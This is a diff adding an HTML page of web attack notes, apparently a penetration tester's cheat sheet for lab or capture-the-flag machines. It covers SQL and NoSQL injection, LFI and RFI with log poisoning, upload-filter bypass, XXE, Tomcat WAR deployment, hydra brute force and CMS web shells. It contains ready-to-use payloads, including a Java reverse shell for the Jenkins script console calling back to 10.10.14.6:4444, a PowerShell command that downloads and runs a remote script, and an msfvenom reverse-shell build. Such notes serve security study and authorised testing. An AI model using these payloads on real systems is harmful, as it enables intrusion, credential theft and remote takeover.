+						<tr>
+							<td>Step #1</td>
+							<td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
+						</tr>
+						<tr>
+							<td>Step #2</td>
+							<td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
+						</tr>
+					</table>
+				</td>
+			</tr>
+			<tr>
+				<td>Execute xp_cmdshell</td>
+				<td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
+			</tr>
+		</table>
+	</ul>
+
+	<li>sqlmap</li>
+	<ul>
+		<li>Usage (batch style) with some flags explained:</li>
+		<ul>
+			<li>sqlmap -r &lt;Saved GET request&gt; --batch [--force-ssl] [--technique=U] [--dbms=mysql] [--password]
+			</li>
+			<table>
+				<tr>
+					<td>-r</td>
+					<td>Specifies the usage a of request file instead of providing a url. This get request file can be
+						made using burp. Intercept the web page request, right click, select copy to file.</td>
+				</tr>
+				<tr>
+					<td>--batch</td>
+					<td>Answers questions for you while running sqlmap</td>
+				</tr>
+				<tr>
+					<td>--technique=U</td>
+					<td>Verify that UNION attack works ahead of time and specify the technique for sqlmap to use</td>
+				</tr>
+				<tr>
+					<td>--password</td>
+					<td>Dump hash for sql users</td>
+				</tr>
+				<tr>
+					<td>--dbs</td>
+					<td>database list</td>
+				</tr>
+				<tr>
+					<td>-D &lt;db name&gt; --dump</td>
+					<td>Dump specific DB</td>
+				</tr>
+				<tr>
+					<td>--dump</td>
+					<td>Dump DB</td>
+				</tr>
+			</table>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>NoSQL Injection</h2>
+
+	<li>Programming Languages and Typical DB Types</li>
+	<table>
+		<tr>
+			<td>NodeJs</td>
+			<td>MongoDB</td>
+		</tr>
+	</table>
+
+	<li>MongoDB Injection</li>
+	<table>
+		<tr>
+			<td>Login bypass</td>
+			<td>username=admin&password[$ne]=anything</td>
+		</tr>
+	</table>
+
+	<hr>
+
+	<h2>LFI</h2>
+
+	<li>Finding LFI</li>
+	<ul>
+		<li>&lt;url&gt;/?page=&lt;Directory&gt;</li>
+		<ul>
+			<li>Try changing directory to access different files</li>
+			<ul>
+				<li>Try files that show in source code</li>
+				<li>Observe response size for file you know do not exist with reponse size for files you believe exist
+				</li>
+				<li>Entering index.php in a LFI means index.php will reload itself until an error occurs or hang
+					indefinitely</li>
+				<ul>
+					<li>"../index.php" could display a different webpage</li>
+				</ul>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>Files to test for LFI:</li>
+	<ul>
+		<li>Windows:</li>
+		<ul>
+			<li>Try forward and backslashes</li>
+			<li>\boot.ini</li>
+			<li>\windows\system32\license.rtf</li>
+			<li>View PHP session ID</li>
+			<ul>
+				<li>&lt;url&gt;/?something=/Windows/Temp/sess_&lt;cookies from PHPSESSIOD in browser
+					&quot;Storage&quot;&gt;</li>
+			</ul>
+			<li>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt</li>
+		</ul>
+		<li>Linux:</li>
+		<ul>
+			<li>/etc/passwd</li>
+			<ul>
+				<li>https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt</li>
+			</ul>
+			<li>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt</li>
+		</ul>
+	</ul>
+
+	<li>Sometimes a website might look for certain words to be included in the url</li>
+	<table>
+		<tr>
+			<td>Original</td>
+			<td>http://&lt;url&gt;/department/manage.php?notes=files/UserNotes.txt</td>
+		</tr>
+		<tr>
+			<td>LFI Exploited</td>
+			<td>http://&lt;url&gt;/department/manage.php?notes=files/UserNotes/../../../../etc/passwd</td>
+		</tr>
+	</table>
+
+	<li>Combine LFI with PHP wrappers</li>
+	<table>
+		<tr>
+			<td>Example 1</td>
+			<td>&lt;url&gt;/menu.php?file=data:text/plain,hello world</td>
+		</tr>
+		<tr>
+			<td>Example 2</td>
+			<td>&lt;url&gt;/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;whoami&quot;) ?&gt;</td>
+		</tr>
+		<tr>
+			<td>LFI - Retrieve php page code in base64</td>
+			<td>
+				<li>&lt;url&gt;/something=php://filter/convert.base64-encode/resource=&lt;php page&gt;</li>
+				<ul>
+					<li>Test index.php first</li>
+				</ul>
+			</td>
+		</tr>
+		<tr>
+			<td>LFI - Retrieve php page by directory</td>
+			<td>&lt;url&gt;/something=php://filter/resource=&lt;php page&gt;</td>
+		</tr>
+	</table>
+
+	<li>Email poisoning</li>
+	<ul>
+		<li>Send email to user that includes a web shell</li>
+		<li>Access the email through LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
+	</ul>
+
+	<li>Log file poisoning</li>
+	<ul>
+		<li>Change User-Agent to web shell</li>
+		<li>Access php access logs</li>
+		<ul>
+			<li>Linux Log locations could be listed in /usr/local/etc/apache24/httpd.conf</li>
+			<li>Possible windows log location - c:\xampp\apache\logs\access.log</li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>RFI</h2>
+
+	<li>Remote file inclusion</li>
+	<ul>
+		<li>phpinfo - allow_url_include must be set to "On" for RFI to work</li>
+		<ul>
+			<li>Old versions had this on by default. New versions have it off by default.</li>
+		</ul>
+	</ul>
+
+	<li>If RFI is found, get a webshell by accessing shell.php</li>
+	<ul>
+		<li>&lt;victim url&gt;/file=&lt;attacker ip&gt;/shell.php</li>
+	</ul>
+
+	<li>Windows</li>
+	<ul>
+		<li>Identify RFI</li>
+
+		<table>
+			<tr>
+				<td>Test RFI using SMB</td>
+				<td>&lt;url&gt;/?something=\\&lt;attacker ip&gt;\test.txt</td>
+			</tr>
+			<tr>
+				<td>Listen on port 445</td>
+				<td>nc -lvnp 445</td>
+			</tr>
+		</table>
+
+		<li>Try to extract a hash</li>
+
+		<table>
+			<tr>
+				<td>Listen for SMB</td>
+				<td>responder -I tun0</td>
+			</tr>
+			<tr>
+				<td>Watch traffic on 445</td>
+				<td>tcpdump -i tun0 port 445</td>
+			</tr>
+		</table>
+
+		<ul>
+			<li>If traffic shows on 445 when attempting the RFI but nothing shows in responder then the server is not
+				vulernable to this attack</li>
+		</ul>
+
+		<br>
+
+		<li>Try setting up SMB Server on attacker and attempt to use RFI to access these files</li>
+		<ul>
+			<li>RFI &lt;url&gt;/&lt;smb share&gt;/shell.php&amp;cmd=whoami</li>
+			<li>Try impacket-smbserver</li>
+			<li>Try built in linux SMB Server</li>
+		</ul>
+	</ul>
+
+	<li>Linux</li>
+	<ul>
+		<li>Identify RFI</li>
+		<table>
+			<tr>
+				<td>Test for RFI</td>
+				<td>&lt;url&gt;/?file=http://&lt;attacker ip&gt;/test.txt</td>
+			</tr>
+			<tr>
+				<td>Listen for victim</td>
+				<td>nc -lnvp 80</td>
+			</tr>
+		</table>
+	</ul>
+
+	<hr>
+
+	<h2>phpinfo.php</h2>
+
+	<table>
+		<tr>
+			<td>allow_url_include = on</td>
+			<td>RFI vulnerability</td>
+		</tr>
+		<tr>
+			<td>file_uploads=on + LFI</td>
+			<td>
+				<li>RCE</li>
+				<ul>
+					<li>https://www.insomniasec.com/downloads/publications/phpinfolfi.py</li>
+					<li>HackTheBox - Poison - https://youtu.be/rs4zEwONzzk?t=601</li>
+				</ul>
+			</td>
+		</tr>
+		<tr>
+			<td>$_SERVER['DOCUMENT_ROOT']</td>
+			<td>Directory of web server files</td>
+		</tr>
+	</table>
+
+	<hr>
+
+	<h2>Upload Restriction Bypass</h2>
+
+	<li>Try uploading with different extensions & file types</li>
+
+	<li>Try double extensions</li>
+	<ul>
+		<li>.php.gif</li>
+		<li>.gif.php</li>
+	</ul>
+
+	<li>Test for extension whitelist vs blacklist</li>
+	<ul>
+		<li>Attempt to upload a random extension (Ex. file.aaaaaaa). If that extension is not allowed then it is likely
+			a extension whitelist is in place.</li>
+	</ul>
+
+	<li>Magic bytes</li>
+	<ul>
+		<li>Bytes at the beginning of a file that indicate which type of file it is, on the byte level</li>
+		<li>Add magic byte from image file to beginning of shell file</li>
+		<li>Get magic bytes from .jpg file</li>
+		<ul>
+			<li>head &lt;file&gt; | xxd</li>
+			<ul>
+				<li>Output file bytes, first few should be the magic bytes</li>
+			</ul>
+			<li>head -c&lt;#&gt; &lt;file&gt; | xxd</li>
+			<ul>
+				<li>Output number of bytes from file and display in readable format</li>
+			</ul>
+		</ul>
+		<li>Add magic bytes using hexeditor</li>
+		<li>Null byte vulnerability (%00)</li>
+		<ul>
+			<li>Terminate strings using null byte to bypass file extensions that are appended by the server</li>
+			<li>Only works on old versions of php</li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>Web Servers & OS Combos</h2>
+
+	<li>Apache on Windows</li>
+	<ul>
+		<li>Not the typical Windows web server</li>
+		<li>Typically used alongside XAMPP</li>
+		<ul>
+			<li>File would be placed in C:\xampp\htdocs</li>
+		</ul>
+		<li>Usually using .php</li>
+	</ul>
+
+	<li>IIS on Windows</li>
+	<ul>
+		<li>Typical Windows web server</li>
+		<li>Files placed in C:\inetpub\htdocs</li>
+		<li>Usually using .asp and/or .aspx</li>
+	</ul>
+
+	<li>nginx</li>
+	<ul>
+		<li>Typically not running PHP, but it is possible</li>
+	</ul>
+
+	<hr>
+
+	<h2>XXE Injection</h2>
+
+	<li>File retrieval</li>
+	<ul>
+		<li>Use php wrappers to access internal files <code>php://filter/convert.base64-encode/resource=</code></li>
+	</ul>
+
+	<pre>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#13;&#10;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&#13;&#10;&lt;container&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/container&gt;</pre>
+
+	<li>SSRF</li>
+
+	<pre>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://website.com&quot;&gt; ]&gt;</pre>
+
+	<hr>
+
+	<h2>Execution After Redirect (EAR)</h2>
+
+	<li>An attacker can ignore a redirect and read the full contents of that page</li>
+
+	<li>Example: If a webpage redirects users who are not logged in, but that web page lacks code termination upon
+		redirect, then an attacker can ignore the redirect and read the full contents of the page.</li>
+
+	<hr>
+
+	<h2>Tomcat</h2>
+
+	<li>Provides a way of running java applications (.WAR files)</li>
+	<li>Tomcat proxy that gives localhost access to the machine</li>
+	<ul>
+		<li>AJP / port 8009</li>
+	</ul>
+
+	<li>Deploy .war reverse shell</li>
+	<ul>
+		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war &gt; shell.war</li>
+		<li>manager-gui - /manager/html/</li>
+		<li>manager-script - /manager/text/</li>
+		<ul>
+			<li>curl -u &apos;&lt;username&gt;:&lt;password&gt;&apos;
+				http://10.129.241.149:8080/manager/text/deploy?path=/shell --upload-file shell.war</li>
+		</ul>
+	</ul>
+
+	<li>Brute force tomcat credentials</li>
+	<ul>
+		<li>hydra -L words.lst -P words.lst http-get://10.0.0.25:8080/host-manager/html</li>
+		<li>hydra -C /seclists/passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+			http-get://10.0.0.25:8080/host-manager/html</li>
+	</ul>
+
+	<li>Helpful Files</li>
+	<ul>
+		<li>tomcat-users.xml</li>
+		<ul>
+			<li>List of user credentials and permissions. This file can be in multiple locations.
+				$CATALINA_BASE/conf/tomcat-users.xml is the configuration file, but any of the below locations could be
+				linked to conf/tomcat-users.xml</li>
+			<li>/etc/tomcat9/tomcat-users.xml</li>
+			<li>/opt/tomcat/apache-tomcat-9.0.54/conf/tomcat-users.xml</li>
+			<li>/usr/share/tomcat9/etc/tomcat-users.xml</li>
+			<li>/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml</li>
+		</ul>
+
+		<li>/usr/lib/systemd/system/tomcat9.service</li>
+		<ul>
+			<li>Will show CATALINA_HOME and CATALINA_BASE variables</li>
+		</ul>
+
+		<li>Find other files</li>
+		<ul>
+			<li>Search apache version + Ubuntu to find the ubuntu distribution that is most likely running on the box.
+				Then google the distribution name + tomcat in order to find the tomcat file directories installed on the
+				box.</li>
+			<li>Install tomcat and search for the location on your own box. Example:
+				<code>sudo apt install tomcat9</code></li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>Wordpress</h2>
+
+	<li>Sensitive Files</li>
+	<ul>
+		<li>wordpress/wp-settings.php</li>
+	</ul>
+
+	<li>Exploitation</li>
+	<ul>
+		<li>Login as admin, edit theme or upload malicious plugin</li>
+		<li>Look for vulnerable plugins</li>
+		<li>Write web shell code to any page we have write access to</li>
+		<ul>
+			<li>Check for writable pages under themes section</li>
+		</ul>
+	</ul>
+
+	<li>Tools</li>
+	<ul>
+		<li>Vane</li>
+		<ul>
+			<li>Free version of wpscan</li>
+		</ul>
+		<li>wpscan</li>
+		<ul>
+			<li>Flags</li>
+			<table>
+				<tr>
+					<td>ap</td>
+					<td>All plugins</td>
+				</tr>
+				<tr>
+					<td>at</td>
+					<td>All Themes</td>
+				</tr>
+				<tr>
+					<td>cb</td>
+					<td>Config Backups</td>
+				</tr>
+				<tr>
+					<td>dbe</td>
+					<td>Database Exports</td>
+				</tr>
+				<tr>
+					<td>u</td>
+					<td>usernames</td>
+				</tr>
+			</table>
+		</ul>
+	</ul>
+
+	<li>Check for credentials saved in plugins</li>
+	<ul>
+		<li>Example: Easy WP SMTP</li>
+		<ul>
+			<li>Plugins > Settings on Easy WP SMTP plugin</li>
+			<ul>
+				<li>Username and password should be saved</li>
+				<ul>
+					<li>Right click and view source to view censored password field</li>
+				</ul>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>WP login page</li>
+	<ul>
+		<li>website.com/wp-login.php</li>
+	</ul>
+
+	<li>Manually Enumerating WordPress</li>
+	<ul>
+		<li>Tools > Site Health > Info > Server & Database</li>
+		<ul>
+			<li>Server running WordPress</li>
+			<li>PHP Version</li>
+			<li>Database host IP</li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>Jenkins</h2>
+
+	<li>RCE if authenticated</li>
+	<ul>
+		<li>Go to "Script Console" and execute the below for a reverse shell</li>
+		<table>
+			<tr>
+				<td>Method 1</td>
+				<td>
+					<pre>&#13;&#10;String host=&quot;10.10.14.6&quot;;&#13;&#10;int port=4444;&#13;&#10;String cmd=&quot;cmd.exe&quot;;&#13;&#10;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();&#13;&#10;&#9;&#9;&#9;&#9;&#9;</pre>
+				</td>
+			</tr>
+			<tr>
+				<td>Method 2</td>
+				<td>
+					<pre>&#13;&#10;cmd = &quot;&quot;&quot; powershell &quot;IEX(New-Object Net.WebClient).downloadString(&apos;http://10.10.14.6/shell.ps1&apos;)&quot; &quot;&quot;&quot;&#13;&#10;println cmd.execute().text&#13;&#10;&#9;&#9;&#9;&#9;&#9;</pre>
+				</td>
+			</tr>
+		</table>
+
+		<li>Create new "Freestyle" project</li>
+		<ul>
+			<li>Noisier, people can see new project being created</li>
+			<li>Build > Add Build Step</li>
+			<ul>
+				<li>Enter command to execute in pop-out box</li>
+			</ul>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>Moodle</h2>
+
+	<li>Tools</li>
+	<ul>
+		<li>moodlescan</li>
+	</ul>
+
+	<li>Moodle version can be found &lt;url&gt;/moodle/theme/upgrade.txt</li>
+
+	<hr>
+
+	<h2>Sharepoint</h2>
+
+	<li>Enumeration</li>
+	<ul>
+		<li>/usr/share/wordlists/seclists/discovery/web_content/sharepoint.txt</li>
+		<li>&lt;url&gt;/_layouts/viewlsts.aspx</li>
+		<ul>
+			<li>Shows different libraries</li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>Gatsby</h2>
+
+	<li>Development mode</li>
+	<ul>
+		<li>If enabled we can interact directly with the web database</li>
+		<ul>
+			<li>/_graphql</li>
+		</ul>
+	</ul>
+
+	<hr>
+
+	<h2>Joomla</h2>
+
+	<li>Default login username: admin</li>
+	<li>No default password</li>
+	<li>Create reverse shell by editing php template in admin panel</li>
+
+	<hr>
+
+	<h2>Webdav</h2>
+
+	<li>Webdav gives the ability to manage files on a web server. Actions such as update, delte, move, and copy.</li>
+	<li>RCE - If we have access to webdav then we can get RCE by uploading a web shell.</li>
+
+	<li>Tools</li>
+	<ul>
+		<li>cadaver</li>
+		<ul>
+			<li>http://&lt;website&gt;/&lt;webdav directory if there is one&gt;</li>
+			<ul>
+				<li>If there are credentials then you will be prompted for them. They do not go on the initial command.
+				</li>
+			</ul>
+		</ul>
+	</ul>
+
+	<li>Credential file - Webdav can use basic authentication. If it does we can find the credentials stored on the web
+		server in a file called passwd.dav. This file is usually in whichever directory that has basic auth enabled.
+	</li>
+	<ul>
+		<li>Example location of this file: /var/www/html/webdav/passwd.dav</li>
+	</ul>
+
+	<hr>
+
+	<h2>Cross-Site Request Forgery (CSRF)</h2>
+
+	<li>A CSRF attack takes place when an attacker crafts a malicious web request and tricks the victim into sending the
+		request to a web application that they are already authenticated to. The malicious web request could do anything
+		such as transfer funds, change account information, or any other action an authenticated user could make on the
+		web application. A website is vulnerable to CSRF attacks if it only uses cookies to validate whether a web
+		request is coming from an authenticated user.</li>
+
+	<br>
+
+	<li>CSRF Tokens</li>
+	<ul>
+		<li>CSRF Tokens can be used to guard against CSRF attacks. A CSRF token is a long random string that is provided
+			by the webserver to the user which is used to prove that they are authenticated. A CSRF token differs from a
+			cookie because it is sent in a different field of the web request. Even though a CSRF token might be stored
+			in the same location as cookies a CSRF attack will not be able to take the value of the CSRF token and place
+			it in the required field of the web request that is required to prove that the request is coming from an
+			authenticated user.</li>
+		<li>Custom headers typically cannot be set in CSRF attacks. See:
+			http://blog.alutam.com/2011/09/14/jersey-and-cross-site-request-forgery-csrf/</li>
+		<ul>
+			<li>Custom headers may be sufficient to stop current CSRF attacks. However, random generated CSRF tokens are
+				smart to use in preparation for if attackers figure out how to set customer headers.</li>
+		</ul>
+	</ul>
+
+	<li>Protections against CSRF:</li>
+	<ul>
+		<li>Synchronizer Token Pattern</li>
+		<ul>
+			<li>A new CSRF token is generated for each form submission or per session.</li>
+			<li>Generating tokens per form submission can cause issues in scenarios such as using the "back" button on
+				the browser, since the CSRF token on the previous page will no longer match what it used to.</li>
+		</ul>
+
+		<li>Double submit cookies</li>
+		<ul>
+			<li>Weaker CSRF protection</li>
+			<li>The server provides a random value as a cookie and the user must submit this cookie value both as a
+				cookie and in a customer header when making web requests.</li>
+		</ul>
+
+		<li>SameSite cookie flag</li>
+		<ul>
+			<li>If this flag is set then it can stop cookies from being sent cross-site which are the basis behind CSRF
+				attacks.</li>
+			<li>A browser might not support this feature.</li>
+			<li>Lacks the ability for fine-grain control. Example: The website (example.com) is a forum and someone
+				posts a link to the forum's delete account function (example.com/DeleteAccount). Any user who clicks
+				this link will send their cookies. If aditional protections such as a CSRF token is not also implemented
+				then the delete account function would execute.</li>
+		</ul>
+
+		<li>Challenge/response pattern</li>
+		<ul>
+			<li>When submitting a web request (such as transferring funds) the server should have a challenge such as
+				asking for a password in order to authenticate the web request. A CSRF attack should not be able to know
+				what the answer to the challenge is, therefore a CSRF will not work.</li>
+		</ul>
+
+		<li>Origin and Referer Headers</li>
+		<ul>
+			<li>Verify that the web request destination origin is something the web application expects.</li>
+			<li>The Origin and Referer headers can only be set by the browser.</li>
+			<li>Examples:</li>
+			<ul>
+				<li>Legitimate request - submitting a fund transfer on bank.com would show the request originated from
+					bank.com</li>
+				<li>Forged request - visting evil.com triggers a CSRF attack to transfer funds on bank.com The request
+					would show originating from evil.com.</li>
+			</ul>
+
+			<li>This protection can cause issues in scenarios where the origin header is altered for legitimate reasons
+				such as using adblocker.</li>
+		</ul>
+	</ul>
+
+	<br>
+
+	<h2>Flask</h2>
+
+	<li>Tools</li>
+	<ul>
+		<li>flask-unsign</li>
+		<table>
+			<tr>
+				<td>Decode Cookie</td>
+				<td>flask-unsign --decode --cookie &apos;&lt;cookie&gt;&apos;</td>
+			</tr>
+			<tr>
+				<td>Bruteforce Cookie</td>
+				<td>flask-unsign --wordlist &lt;wordlist&gt; --unsign --cookie &apos;&lt;cookie&gt;&apos; --no-literal-eval</td>
+			</tr>
+			<tr>
+				<td>Sign Cookie</td>
+				<td>flask-unsign --sign --cookie &quot;&lt;plaintext json cookie&gt;&quot; --secret &apos;&lt;secret_key&gt;&apos;</td>
+			</tr>
+			<tr>
+				<td>Sign Cookie (Legacy)</td>
+				<td>flask-unsign --sign --cookie &quot;&lt;plaintext json cookie&gt;&quot; --secret &apos;&lt;secret_key&gt;&apos; --legacy</td>
+			</tr>
+		</table>
+	</ul>
+
+</body>
+</html>
